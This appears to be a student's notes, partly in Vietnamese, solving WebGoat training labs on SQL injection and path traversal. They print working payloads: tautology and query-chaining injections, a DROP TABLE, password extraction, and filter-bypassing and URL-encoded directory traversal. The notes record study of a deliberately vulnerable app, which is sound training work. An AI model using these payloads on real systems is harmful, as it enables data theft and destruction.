@@ -1,0 +1,69 @@
+SQL injection (intro):
+2: What is SQL?
+SELECT department FROM employees WHERE userid='96134'
+3: Data Manipulation Language (DML)
+UPDATE employees SET department='Sales' WHERE userid='89762'
+4: Data Definition Language (DDL)
+ALTER TABLE employees ADD phone varchar(20)
+5: Data Control Language (DCL)
+GRANT ALL ON grant_rights TO unauthorized_user
+9: Try It! String SQL injection
+SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
+10: Try It! Numeric SQL injection
+SELECT * From user_data WHERE Login_Count = 1 and userid= 767 OR 1=1
+User_id có thể bị injection
+11: Compromising confidentiality with String SQL injection
+Cả 2 trường Employee Name và Authentication TAN đều có thể injection/
+* Employee Name: ' OR 1=1; --
+* Authenticaiton TAN: abacaw123
+* Employee Name: abacawx123
+* Authentication TAN: ' OR 1=1; --
+12: Compromising Integrity with Query chaining
+Sử dụng ' OR 1=1 -- để trích xuất toàn bộ bảng
+Sử dụng câu lệnh UPDATE để chỉnh sửa SALARY
+' OR 1=1; UPDATE employees SET salary='100000' WHERE first_name='John' --
+13: Compromising Availability
+'; DROP TABLE access_log --
+
+SQL Injection (advanced):
+3: Try It! Pulling data from other tables
+3a,
+"'; SELECT * FROM user_system_data WHERE 1=1 --
+SELECT * FROM user_data WHERE last_name = '"'; SELECT * FROM user_system_data WHERE 1=1 --'
+3b,
+"'; SELECT password FROM user_system_data WHERE user_name='dave' --
+
+SQL Injection (mitigation):
+5,6: Try it! Writing safe code
+Sử dụng giải pháp bài 5 cho bài 6
+
+Path Traversal
+2: Path traversal while uploading files
+Update profile với các trường thông tin:
+* Full Name: test
+* Email: test@test.com
+* Password: 1234
+Response: "Profile has been updated, your image is available at: /home/webgoat/.webgoat-8.2.1/PathTraversal/tuss-ilak/test"
+Dữ liêu của trường Full Name được sử dụng vào đường dẫn
+Sử dụng "../" để thực hiện path traversal
+3: Path traversal while uploading files
+Đầu vào của Full Name được lọc "../"
+../test = test
+..../ = ..test
+/test = //test = ///test = test
+Sử dụng "....//", phần "../" ở giữa được loại bỏ, phần còn lại "../" được inject thành công.
+4: Path traversal while uploading files
+Thay vì sử dụng Full Name, lab này sử dụng tên file làm đường dẫn.
+Thực hiện tương tự 2.
+5: Retrieving other files with a path traversal
+Mục đích: Truy cập file path-traversal-secret.jpg
+Mỗi khi click vào "Show random cat picture" một bức ảnh mới sẽ được trả về.
+Với hint của lab, phần path có thể inject là "GET /WebGoat/PathTraversal/random-picture?id=1"
+Khi sử dụng GET request với id=1.jpg, ta thấy location trả về có dạng 1.jpg.jpg. Dự đoán: Ứng dụng tự động thêm phần mở rộng ".jpg"
+Sử dụng Burp Repeater, thay đổi path với thông tin: /WebGoat/PathTraversal/random-picture?id=../"
+Response: "Illegal characters are not allowed in the query params"
+Url-encode phần "../" thành "%2e%2e%2f":
+Response: Đường dẫn thư mục được trả về tuy nhiên chưa tìm được file path-traversal-secret.jpg
+Sử dụng "%2e%2e%2f%2e%2e%2f", xuất hiện path-traversal-secret.jpg trong response
+Sử dụng "%2e%2e%2f%2e%2e%2f/path-traversal-secret", response: "You found it submit the SHA-512 hash of your username as answer"
+Flag cần tìm là mã băm SHA-512 với username.
